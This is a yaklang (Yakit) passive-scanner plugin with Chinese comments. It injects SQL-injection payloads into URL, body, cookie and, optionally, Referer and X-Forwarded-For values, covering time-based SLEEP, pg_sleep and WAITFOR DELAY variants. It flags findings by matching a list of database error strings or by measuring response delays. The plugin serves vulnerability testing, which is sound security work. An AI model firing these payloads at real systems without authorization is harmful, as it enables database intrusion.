//记录已经扫描过的数据包
skip = []
//默认黑名单
blackblack=`
*github.com
*gitlab.com
*bitbucket.org
*gitee.com
*amazonaws.com
*cloudfront.net
*aliyuncs.com
*qcloud.com
*tencentcs.com
*myqcloud.com
*huawei.com
*hwclouds.com
*azure.com
*windows.net
*oraclecloud.com
*googleapis.com
*googleusercontent.com
*qq.com
*amap.com
*gaode.com
*baidu.com
*bdstatic.com
*bdimg.com
*openstreetmap.org
*osm.org
*here.com
*google.com
*wikipedia.org
*mozilla.org
*stackoverflow.com
*docker.com
*dockerhub.com
*npmjs.com
*pypi.org
*python.org
*nodejs.org
*golang.org
*rust-lang.org
*bootstrapcdn.com
*cdnjs.com
*cloudflare.com
*jsdelivr.net
*fastly.net
*akamaihd.net
*akamai.net
*fonts.gstatic.com
*googletagmanager.com
*google-analytics.com
*baidustatic.com
*umeng.com
*cnzz.com
*gov.cn
`
whiteHosts = cli.Text("whiteHosts", cli.setHelp("按行分隔"), cli.setVerboseName("Host白名单"))
blackHosts = cli.Text("blackHosts", cli.setHelp("按行分隔"), cli.setVerboseName("Host黑名单"))
defaultBlack=cli.Bool("defaultBlack", cli.setHelp("勾选后会把一些公共服务、开发平台、云厂商、常见静态资源 CDN 都屏蔽掉，避免漏扫插件扫描到无关的第三方"),cli.setVerboseName("默认黑名单"))
proxy1 = cli.String("proxy", cli.setHelp("http://xxx:xx"), cli.setVerboseName("代理"))
notTestCookie = cli.Bool("notTestCookie", cli.setHelp("勾选后将不再测试Cookie里的参数"), cli.setVerboseName("不测试Cookie"))
delay1=cli.Float("delay", cli.setVerboseName("请求间隔(s)"),cli.setDefault(0.5))
other=cli.Bool("other", cli.setDefault(false),cli.setHelp("勾选后将开启XFF、Ref注入"),cli.setVerboseName("罕见的注入"))
cli.check()
mirrorFilteredHTTPFlow = func(isHttps /* bool */, url /* string */, req /* []byte */, rsp /* []byte */, body /* []byte */) {
    if defaultBlack{
        blackHosts+=blackblack
        //println(blackHosts)
    }
    addr = str.ParseStringUrlToUrlInstance(url)~.Host
    w = str.ParseStringToLines(whiteHosts)//白名单    
    b = str.ParseStringToLines(blackHosts)//黑名单    

    // 使用 global 语法检查白名单  
    if len(w) > 0 && !str.MatchAnyOfGlob(addr, w...) {  
        println(f"${addr}不在白名单内,跳过扫描")  
        return  
    }  
    
    // 使用 global 语法检查黑名单  
    if str.MatchAnyOfGlob(addr, b...) {  
        println(f"${addr}在黑名单内,跳过扫描")  
        return  
    }
    

    codes = [404, 502, 301]
    if poc.ParseBytesToHTTPResponse(rsp)~.StatusCode in codes {
        println("状态码判定跳过")
        return
    }
    
    


    # 后缀黑名单：遇到这些文件类型将跳过扫描
    suffix_blacklist = [
        ".js",     # JavaScript 脚本
        ".css",    # 样式表
        ".jpg", ".jpeg", ".png", ".gif", ".webp", ".svg",  # 图片
        ".ico",    # 网站图标
        ".woff", ".woff2", ".ttf", ".eot",  # 字体文件
        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",  # 文档类
        ".zip", ".rar", ".tar", ".gz", ".7z",  # 压缩包
        ".mp3", ".wav", ".mp4", ".avi", ".mov", ".flv", ".mkv",  # 音视频
        ".exe", ".dll", ".bin",  # 可执行文件
        ".apk", ".ipa",  # 移动端安装包
        ".json", ".xml",  # 通常为 API 接口响应格式，不直接注入
        ".csv",           # 数据文件，通常不可注入
        ".log",           # 日志文件
        ".txt",           # 文本文件
        ".bak", ".old", ".swp",  # 备份文件或临时文件
    ]
    for i in suffix_blacklist {
        if str.HasSuffix(
            str.ToLower(str.ParseStringUrlToUrlInstance(url)~.Path), 
            i, 
        ) {
            printf("后缀处于黑名单，跳过扫描")
            return
        }
    }





//借鉴好人、Li2737的payload
    payloads = [
"鎈'\"\\(", 
"'And(sElect*fRom(SeleCt+SleEp(3))a/**/uNiOn/**/sElect+1)='", 
"'XOR(SELECT(0)FROM(SELECT(SLEEP(3)))a)XOR'Z",
"\"aNd(seLect*From(seLeCt+sleEp(3))a/**/UniOn/**/selEcT+1)=\"", 
"'/**/And(sEleCt'1'fRom/**/Pg_slEep(3))::text>'0", 
"\"/**/and(sElect'1'frOm/**/Pg_sLeep(3))::text>\"0", 
"(sEleCt*fRom(seLect+slEep(3)union/**/sEleCt+1)a)", 
"'+WAITFOR+DELAY+'0:0:3'--+", 
"\"+WAITFOR+DELAY+'0:0:3'--+",
"';WAITFOR DELAY '0:0:3'--"
]

    keywords = [
    "Microsoft OLE DB Provider for ODBC Drivers error",
    "You have an error in your SQL syntax",//
    "ORA-00933: SQL command not properly ended",
    "Microsoft SQL Native Client error",
    "Query failed: ERROR: syntax error at or near",
    "MySQL Error: 1064",
    "mysql error with query",
    "SQL syntax error",//
    "PostgreSQL query failed: ERROR: parser: parse error",
    "Warning: mysql_fetch_array",
    "Warning: mysql_num_rows",
    "Warning: mysql_query",
    "Warning: mysql_fetch_assoc",
    "Warning: mysql_result",
    "ERROR: parser: parse error",
    "XPATH syntax error",
    "XML parsing error",
    "Unknown column '",
    "SQLSTATE[",//
    "Error while evaluating XPath expression",
    "Operand of right-handed unary operator must be a number",
    "ERROR: invalid input syntax for type integer",
    "ERROR: permission denied",
    "ERROR: duplicate key value violates unique constraint",
    "ERROR: division by zero",
    "ERROR: current transaction is aborted",
    "ERROR: invalid foreign key",
    "ORA-01756:",
    "ORA-01722:",
    "ORA-00942:",
    "ORA-01031:",
    "ORA-00923:",
    "ORA-00917:",
    "ORA-00907:",
    "ORA-01403:",
    "ORA-01422:",
    "ORA-06512:",
    "Msg 102, Level 15, State 1",
    "Incorrect syntax near",
    "Invalid object name",
    "The EXECUTE permission was denied on the object",
    "Conversion failed when converting",
    "Arithmetic overflow error",
    "String or binary data would be truncated",
    "Cannot open database requested",
    "A network-related or instance-specific error",
    "Untrusted domain authentication",
    "Violation of PRIMARY KEY constraint",
    "Subquery returned more than 1 value",
    //"syntax error",
    "parse error",
    "unexpected end of SQL command",
    "could not execute query",
    "failed to execute statement",
    "unterminated quoted string",
    "division by zero",
    "data type mismatch",
    //"invalid parameter",
    "unknown function",
    "ambiguous column name",
    "subquery must return only one column",
    "too many SQL variables",
    "ORA-0",
    "SQL state",
    "Database Error Occurred",//
    "Subquery returns more than",//
    "System.Data.SqlClient.SqlException",//
    "附近有语法错误",
    "SqlException",
    "的字符串没有正确结束",
    "SQLStatementException",
    "PSQLException"
]
    freq = fuzz.HTTPRequest(req, fuzz.https(isHttps))~
    //获取除Cookie外的所有参数
    params = freq.GetCommonParams()
    //生成数据包的标识符
    md51 = codec.Md5(addr + string(str.ParseStringUrlToUrlInstance(url)~.Path) + string(params))
    if md51 in skip {
        return
    } else {
        skip.Append(md51)
    }

    urlIns=str.ParseStringUrlToUrlInstance(url)~
    title=urlIns.Host+urlIns.Path

//遍历所有参数
    for p in params {
        if notTestCookie {
            //跳过Cookie里的参数
            if p.IsCookieParams() {
                continue
            }
        }

        for payload in payloads {
            p.DisableAutoEncode(false)
            value = payload
            resu, _ = p.Fuzz(value).ExecFirst(fuzz.WithTimeOut(10), fuzzx.proxy(proxy1),fuzz.WithDelay(delay1))
            //关键字匹配
            if str.StringContainsAnyOfSubString(string(resu.LowhttpResponse.GetBody()), keywords){
                risk.NewRisk(
                    addr, 
                    risk.title(f`${title}   参数${p.Name()}存在SQL注入`), 
                    risk.severity("critical"), 
                    risk.parameter(p.Name()), 
                    risk.payload(value), 
                    risk.description("sql注入漏洞"), 
                    risk.solution("对输入内容进行过滤，转义特殊字符（如单引号、双引号、分号等），防止恶意SQL片段被注入"), 
                    risk.typeVerbose("SQL注入漏洞"), 
                    risk.request(resu.RequestRaw), 
                    risk.response(resu.ResponseRaw), 
                    risk.type("sqlinjection"), 
                    risk.details("响应含有SQL语句报错"), 
                )
                return
            } else if resu.ServerDurationMs >= 3000 && resu.ServerDurationMs <= 9000 && payload!="鎈'\"\\(" {
                value = str.Replace(payload, "3", "5", 1)
                resu, _ = p.Fuzz(value).ExecFirst(fuzz.WithTimeOut(16), fuzzx.proxy(proxy1))
                if resu.ServerDurationMs >= 5000 && resu.ServerDurationMs <= 15000 {
                    risk.NewRisk(
                        addr, 
                        risk.title(f`${title}   参数${p.Name()}存在SQL注入`), 
                        risk.severity("critical"), 
                        risk.parameter(p.Name()), 
                        risk.payload(value), 
                        risk.description("sql注入漏洞"), 
                        risk.solution("对输入内容进行过滤，转义特殊字符（如单引号、双引号、分号等），防止恶意SQL片段被注入"), 
                        risk.typeVerbose("SQL注入漏洞"), 
                        risk.request(resu.RequestRaw), 
                        risk.response(resu.ResponseRaw), 
                        risk.type("sqlinjection"), 
                        risk.details(f"响应延时 ${resu.ServerDurationMs} ms"), 
                    )
                    return
                }
            }
        }
    }
    if !other{
        return
    }

    //Referer、X-Forwarded-For注入
    testHeaders = ["Referer", "X-Forwarded-For"]
    headers = freq.GetHeaderParams()

    // 获取现有请求头值
    existingHeaders = {}
    for h in headers {
        if h.Name() in testHeaders {
            existingHeaders[h.Name()] = h.ValueString()
        }
    }
    

    for headerName in testHeaders {
        for payload in payloads {
            testValue = ""

            // 检查是否有原有值
            if existingHeaders[headerName] != nil && existingHeaders[headerName] != "" {
                testValue = sprintf("%s%s", existingHeaders[headerName], payload)
            } else {
                if headerName == "Referer" {
                    currentURL = freq.GetUrl()
                    // 统一去除URL参数
                    cleanURL, _, _ = str.Cut(currentURL, "?")
                    testValue = sprintf("%s%s", cleanURL, payload)
                } else if headerName == "X-Forwarded-For" {
                    randomIP = sprintf("%d.%d.%d.%d", randn(0, 255), randn(0, 255), randn(0, 255), randn(0, 255))
                    testValue = sprintf("%s%s", randomIP, payload)
                }
            }
            

// 使用FuzzHTTPHeader测试    
            resu, err = freq.FuzzHTTPHeader(headerName, testValue).ExecFirst(
                fuzz.WithTimeOut(10), 
                fuzzx.proxy(proxy1), 
                fuzz.WithDelay(delay1), 
            )
            if err != nil {
                continue// 跳过错误的请求  // 跳过错误的请求  
            }
            

// 关键字匹配检测  
            if str.StringContainsAnyOfSubString(
                string(resu.LowhttpResponse.GetBody()), 
                keywords, 
            ) {
                risk.NewRisk(
                    addr, 
                    risk.title(f`${title} 参数${headerName}存在SQL注入`), 
                    risk.severity("critical"), 
                    risk.parameter(headerName), 
                    risk.payload(testValue), 
                    risk.description("sql注入漏洞"), 
                    risk.solution("对输入内容进行过滤，转义特殊字符"), 
                    risk.typeVerbose("SQL注入漏洞"), 
                    risk.request(resu.RequestRaw), 
                    risk.response(resu.ResponseRaw), 
                    risk.type("sqlinjection"), 
                    risk.details("响应含有SQL语句报错"), 
                )
                return
            }
            

// 时间延迟检测    
            if resu.ServerDurationMs >= 3000 && resu.ServerDurationMs <= 9000 && payload != "鎈'\"\\(" {
                delayValue = str.Replace(payload, "3", "5", 1)
                delayTestValue = ""

                // 构建延迟测试值
                if existingHeaders[headerName] != nil && existingHeaders[headerName] != "" {
                    delayTestValue = sprintf("%s%s", existingHeaders[headerName], delayValue)
                } else {
                    if headerName == "Referer" {
                        currentURL = freq.GetUrl()
                        cleanURL, _, _ = str.Cut(currentURL, "?")
                        delayTestValue = sprintf("%s%s", cleanURL, delayValue)// 修正：使用delayValue  
                    } else if headerName == "X-Forwarded-For" {
                        randomIP = sprintf("%d.%d.%d.%d", randn(0, 255), randn(0, 255), randn(0, 255), randn(0, 255))
                        delayTestValue = sprintf("%s%s", randomIP, delayValue)
                    }
                }
                

                resu2, err2 = freq.FuzzHTTPHeader(headerName, delayTestValue).ExecFirst(fuzz.WithTimeOut(16), fuzzx.proxy(proxy1))
                if err2 != nil {
                    continue// 跳过错误的请求  // 跳过错误的请求  
                }
                

                if resu2.ServerDurationMs >= 5000 && resu2.ServerDurationMs <= 15000 {
                    risk.NewRisk(
                        addr, 
                        risk.title(f`${title} 参数${headerName}存在SQL注入`), 
                        risk.severity("critical"), 
                        risk.parameter(headerName), 
                        risk.payload(delayTestValue), 
                        risk.description("sql注入漏洞"), 
                        risk.solution("对输入内容进行过滤，转义特殊字符"), 
                        risk.typeVerbose("SQL注入漏洞"), 
                        risk.request(resu2.RequestRaw), 
                        risk.response(resu2.ResponseRaw), 
                        risk.type("sqlinjection"), 
                        risk.details(f"响应延时 ${resu2.ServerDurationMs} ms"), 
                    )
                    return
                }
            }
        }
    }
}
params: "[{\"Field\":\"whiteHosts\",\"TypeVerbose\":\"text\",\"FieldVerbose\":\"Host白名单\",\"Help\":\"按行分隔\",\"MethodType\":\"text\"},{\"Field\":\"blackHosts\",\"TypeVerbose\":\"text\",\"FieldVerbose\":\"Host黑名单\",\"Help\":\"按行分隔\",\"MethodType\":\"text\"},{\"Field\":\"defaultBlack\",\"TypeVerbose\":\"boolean\",\"FieldVerbose\":\"默认黑名单\",\"Help\":\"勾选后会把一些公共服务、开发平台、云厂商、常见静态资源 CDN 都屏蔽掉，避免漏扫插件扫描到无关的第三方\",\"MethodType\":\"boolean\"},{\"Field\":\"notTestCookie\",\"TypeVerbose\":\"boolean\",\"FieldVerbose\":\"不测试Cookie\",\"Help\":\"勾选后将不再测试Cookie里的参数\",\"MethodType\":\"boolean\"},{\"Field\":\"other\",\"DefaultValue\":\"false\",\"TypeVerbose\":\"boolean\",\"FieldVerbose\":\"罕见的注入\",\"Help\":\"勾选后将开启XFF、Ref注入\",\"MethodType\":\"boolean\"},{\"Field\":\"proxy\",\"TypeVerbose\":\"string\",\"FieldVerbose\":\"代理\",\"Help\":\"http://xxx:xx\",\"MethodType\":\"string\"},{\"Field\":\"delay\",\"DefaultValue\":\"0.5\",\"TypeVerbose\":\"float\",\"FieldVerbose\":\"请求间隔(s)\",\"MethodType\":\"float\"}]"
help: 遍历请求数据包的每个参数、请求Referer头、X-Forwarded-For头，打sql注入的payload
